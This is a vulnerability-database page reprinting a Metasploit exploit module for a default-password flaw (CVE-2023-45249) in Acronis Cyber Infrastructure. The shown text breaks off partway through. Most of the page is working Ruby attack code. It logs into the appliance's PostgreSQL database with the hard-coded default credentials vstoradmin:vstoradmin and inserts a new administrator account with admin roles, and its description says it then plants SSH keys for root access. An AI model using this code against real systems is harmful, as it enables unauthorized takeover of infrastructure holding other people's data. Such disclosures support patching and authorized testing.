---
title: Acronis Cyber Infrastructure Default Password Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024100017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-10-08
fetch_date: 2025-10-06T18:49:02.421711
---

# Acronis Cyber Infrastructure Default Password Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Acronis Cyber Infrastructure Default Password Remote Code Execution** **2024.10.07**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'sshkey'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include BCrypt
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::Postgres
include Msf::Exploit::Remote::SSH
prepend Msf::Exploit::Remote::AutoCheck
# ssh\_socket
attr\_accessor :ssh\_socket
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Acronis Cyber Infrastructure default password remote code execution',
'Description' => %q{
Acronis Cyber Infrastructure (ACI) is an IT infrastructure solution that provides storage,
compute, and network resources. Businesses and Service Providers are using it for data storage,
backup storage, creating and managing virtual machines and software-defined networks, running
cloud-native applications in production environments.
This module exploits a default password vulnerability in ACI which allow an attacker to access
the ACI PostgreSQL database and gain administrative access to the ACI Web Portal.
This opens the door for the attacker to upload SSH keys that enables root access
to the appliance/server. This attack can be remotely executed over the WAN as long as the
PostgreSQL and SSH services are exposed to the outside world.
ACI versions 5.0 before build 5.0.1-61, 5.1 before build 5.1.1-71, 5.2 before build 5.2.1-69,
5.3 before build 5.3.1-53, and 5.4 before build 5.4.4-132 are vulnerable.
},
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
'Acronis International GmbH', # discovery
],
'References' => [
['CVE', '2023-45249'],
['URL', 'https://security-advisory.acronis.com/advisories/SEC-6452'],
['URL', 'https://attackerkb.com/topics/T2b62daDsL/cve-2023-45249']
],
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux'],
'Privileged' => true,
'Arch' => [ARCH\_CMD],
'Targets' => [
[
'Unix/Linux Command',
{
'Platform' => ['unix', 'linux'],
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
],
[
'Interactive SSH',
{
'Type' => :ssh\_interact,
'DefaultOptions' => {
'PAYLOAD' => 'generic/ssh/interact'
},
'Payload' => {
'Compat' => {
'PayloadType' => 'ssh\_interact'
}
}
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2024-07-24',
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 8888,
'USERNAME' => 'vstoradmin',
'PASSWORD' => 'vstoradmin',
'DATABASE' => 'keystone',
'SSH\_TIMEOUT' => 30,
'WfsDelay' => 5
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
deregister\_options('SQL', 'RETURN\_ROWSET', 'VERBOSE')
register\_options([
OptString.new('TARGETURI', [true, 'Path to the Acronis Cyber Infra application', '/']),
OptPort.new('DBPORT', [true, 'PostgreSQL DB port', 6432]),
OptPort.new('SSHPORT', [true, 'SSH port', 22]),
OptString.new('PRIV\_KEY\_FILE', [false, 'SSH private key file in PEM format (ssh-keygen -t rsa -b 2048 -m PEM -f <priv\_key\_file>)', ''])
])
register\_advanced\_options([
OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 10])
])
end
# add an admin user to the Acronis PostgreSQL DB (keystone) using default credentials (vstoradmin:vstoradmin)
def add\_admin\_user(username, userid, password)
vprint\_status("Creating admin user #{username} with userid #{userid}")
# add new admin user to the user table
res\_query = postgres\_query("INSERT INTO \"user\" VALUES(\'#{userid}\','{}','T',NULL,NULL,NULL,'default');", datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
# add new admin user to the local\_user table
res\_query = postgres\_query('SELECT \* FROM "local\_user" WHERE id = ( SELECT MAX (id) FROM "local\_user" );', datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
id\_luser = res\_query[:complete].rows[0][0].to\_i + 1
res\_query = postgres\_query("INSERT INTO \"local\_user\" VALUES(\'#{id\_luser}\',\'#{userid}\','default',\'#{username}\',NULL,NULL);", datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
# hash the password
password\_hash = Password.create(password)
today = Date.today
vprint\_status("Setting password #{password} with hash #{password\_hash}")
res\_query = postgres\_query('SELECT \* FROM "password" WHERE id = ( SELECT MAX (id) FROM "password" );', datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
id\_pwd = res\_query[:complete].rows[0][0].to\_i + 1
res\_query = postgres\_query("INSERT INTO \"password\" VALUES(\'#{id\_pwd}\',\'#{id\_luser}\',NULL,'F',\'#{password\_hash}\',0,NULL,DATE \'#{today}\');", datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
# Getting the admin roles and assign this to the new admin user
vprint\_status('Getting the admin roles')
res\_query = postgres\_query("SELECT \* FROM \"project\" WHERE name = 'admin' AND domain\_id = 'default';", datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
id\_project\_role = res\_query[:complete].rows[0][0]
res\_query = postgres\_query("SELECT \* FROM \"role\" WHERE name = 'admin';", datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
id\_admin\_role = res\_query[:complete].rows[0][0]
vprint\_status("Assigning the admin roles: #{id\_project\_role} and #{id\_admin\_role}")
res\_query = postgres\_query("INSERT INTO \"assignment\" VALUES('UserProject',\'#{userid}\',\'#{id\_project\_role}\',\'#{id\_admin\_role}\','F');", datastore['VERBOSE'])
return false unless res\_query.keys[0] == :complete
vprint\_status("Successfully created admin user #{username} with password #{password} to access the Acronis Admin Portal.")
true
end
# create SSH session.
# based on the ssh\_opts can this be key or password based.
# if login is successfull, return true else return false. All other...